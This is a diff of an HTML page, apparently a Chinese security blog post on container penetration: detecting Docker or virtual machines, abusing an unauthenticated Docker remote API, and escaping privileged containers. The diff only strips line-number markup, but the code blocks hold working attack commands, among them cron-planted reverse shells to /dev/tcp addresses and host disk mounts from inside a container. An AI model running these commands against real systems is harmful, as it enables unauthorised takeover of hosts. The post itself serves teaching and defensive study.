@@ -253,7 +253,7 @@
 <span id="more"></span>
 
 <p>本文涉及内容，仅限于网络安全从业者学习交流，切勿用于非法用途…</p>
-<h2 id="0x01-虚拟环境探测"><a href="#0x01-虚拟环境探测" class="headerlink" title="0x01 虚拟环境探测"></a>0x01 虚拟环境探测</h2><h3 id="1-容器环境"><a href="#1-容器环境" class="headerlink" title="1. 容器环境"></a>1. 容器环境</h3><pre class="line-numbers language-none"><code class="language-none">1. 检查&#x2F;.dockerenv文件是否存在
+<h2 id="0x01-虚拟环境探测"><a href="#0x01-虚拟环境探测" class="headerlink" title="0x01 虚拟环境探测"></a>0x01 虚拟环境探测</h2><h3 id="1-容器环境"><a href="#1-容器环境" class="headerlink" title="1. 容器环境"></a>1. 容器环境</h3><pre class="language-none"><code class="language-none">1. 检查&#x2F;.dockerenv文件是否存在
 
 ls &#x2F; -al | grep dockerenv
 
@@ -261,9 +261,9 @@ ls &#x2F; -al | grep dockerenv
 
 cat &#x2F;proc&#x2F;1&#x2F;cgroup | grep docker
 
-cat &#x2F;proc&#x2F;1&#x2F;cpuset | grep docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+cat &#x2F;proc&#x2F;1&#x2F;cpuset | grep docker</code></pre>
 
-<h3 id="2-检测方法"><a href="#2-检测方法" class="headerlink" title="2. 检测方法"></a>2. 检测方法</h3><pre class="line-numbers language-none"><code class="language-none">1) 容器环境
+<h3 id="2-检测方法"><a href="#2-检测方法" class="headerlink" title="2. 检测方法"></a>2. 检测方法</h3><pre class="language-none"><code class="language-none">1) 容器环境
 
 cat &#x2F;proc&#x2F;1&#x2F;cgroup | grep -qi docker \
     &amp;&amp; echo &quot;Docker&quot; \
@@ -292,9 +292,9 @@ systemd-detect-virt  &#x2F;&#x2F;如果是虚拟机，则会输出虚拟机类�
 
 lscpu | grep -i &#39;Hypervisor vendor&#39; | cut -d &#39;:&#39; -f 2 | tr -d &#39; &#39; &#x2F;&#x2F; 根据 lscpu 命令输出，查看Hypervisor vendor属性值
 
-dmidecode -t system  &#x2F;&#x2F; 获取更多的虚拟机信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+dmidecode -t system  &#x2F;&#x2F; 获取更多的虚拟机信息</code></pre>
 
-<h3 id="3-探测脚本"><a href="#3-探测脚本" class="headerlink" title="3. 探测脚本"></a>3. 探测脚本</h3><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;sh
+<h3 id="3-探测脚本"><a href="#3-探测脚本" class="headerlink" title="3. 探测脚本"></a>3. 探测脚本</h3><pre class="language-none"><code class="language-none">#!&#x2F;bin&#x2F;sh
 
 detect_container()
 &#123;
@@ -367,12 +367,12 @@ detect_virtual_type()
     || detect_virtual_machine || echo &quot;Unknown&quot;
 &#125;
 
-detect_virtual_type &quot;$@&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+detect_virtual_type &quot;$@&quot;</code></pre>
 
 <h2 id="0x02-Docker攻击面"><a href="#0x02-Docker攻击面" class="headerlink" title="0x02 Docker攻击面"></a>0x02 Docker攻击面</h2><h3 id="1-docker-daemon-api-unauth"><a href="#1-docker-daemon-api-unauth" class="headerlink" title="1. docker daemon api unauth"></a>1. docker daemon api unauth</h3><p>Docker remote Api未授权访问的攻击原理与Redis未授权类似，是向运行该应用的服务器写文件，从而拿到服务器的权限，docker remote api可以执行docker命令，docker守护进程监听在0.0.0.0，可直接调用API来操作docker</p>
-<pre class="line-numbers language-none"><code class="language-none">sudo dockerd -H unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock -H 0.0.0.0:2375<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="language-none"><code class="language-none">sudo dockerd -H unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock -H 0.0.0.0:2375</code></pre>
 
-<pre class="line-numbers language-none"><code class="language-none">1) 容器挂载宿主机&#x2F;root&#x2F;目录，写ssh公钥
+<pre class="language-none"><code class="language-none">1) 容器挂载宿主机&#x2F;root&#x2F;目录，写ssh公钥
 
     docker -H tcp:&#x2F;&#x2F;192.168.1.10:2375 run -it -v &#x2F;root&#x2F;:&#x2F;root&#x2F; --name alpine_linux image_id sh
 
@@ -401,10 +401,10 @@ detect_virtual_type &quot;$@&quot;<span aria-hidden="true" class="line-numbers-r
     # 执行shell反弹命令
     echo &#39;* * * * * sh -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.143.158&#x2F;9966 0&gt;&amp;1&#39; &gt;&gt; &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root
 
-    echo -e &quot;\n\n* * * * * root sh -i&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.143.158&#x2F;9966 0&gt;&amp;1\n\n&quot; &gt;&gt; &#x2F;etc&#x2F;crontab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    echo -e &quot;\n\n* * * * * root sh -i&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.143.158&#x2F;9966 0&gt;&amp;1\n\n&quot; &gt;&gt; &#x2F;etc&#x2F;crontab</code></pre>
 
 <h3 id="2-容器逃逸漏洞"><a href="#2-容器逃逸漏洞" class="headerlink" title="2. 容器逃逸漏洞"></a>2. 容器逃逸漏洞</h3><p>Docker逃逸主要由三类原因引起，配置不当、软件设计缺陷及内核漏洞</p>
-<h4 id="a-配置不当导致逃逸"><a href="#a-配置不当导致逃逸" class="headerlink" title="a. 配置不当导致逃逸"></a>a. 配置不当导致逃逸</h4><pre class="line-numbers language-none"><code class="language-none">1) docker remote api未授权访问
+<h4 id="a-配置不当导致逃逸"><a href="#a-配置不当导致逃逸" class="headerlink" title="a. 配置不当导致逃逸"></a>a. 配置不当导致逃逸</h4><pre class="language-none"><code class="language-none">1) docker remote api未授权访问
 
 2) docker.sock挂载到容器内部
 
@@ -445,7 +445,7 @@ fdisk -l               # 在容器内查看磁盘文件
 mkdir &#x2F;test            # 将&#x2F;dev&#x2F;sda1 挂载到新建目录
 mount &#x2F;dev&#x2F;sda3 &#x2F;test
 
-echo &#39;* * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.100&#x2F;2233 0&gt;&amp;1&#39; &gt;&gt; &#x2F;test&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root  # 将计划任务写入到宿主机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+echo &#39;* * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.100&#x2F;2233 0&gt;&amp;1&#39; &gt;&gt; &#x2F;test&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root  # 将计划任务写入到宿主机</code></pre>
 
 <h4 id="b-软件设计缺陷导致逃逸"><a href="#b-软件设计缺陷导致逃逸" class="headerlink" title="b. 软件设计缺陷导致逃逸"></a>b. 软件设计缺陷导致逃逸</h4><p><strong>Shocker 攻击</strong></p>
 <p>漏洞原理：Shocker攻击的关键是执行了系统调用open_by_handle_at函数，调用open_by_handle_at函数需要具备CAP_DAC_READ_SEARCH能力，而Docker1.0版本对Capability使用黑名单管理策略，并且没有限制CAP_DAC_READ_SEARCH能力，因而引发了容器逃逸的风险</p>
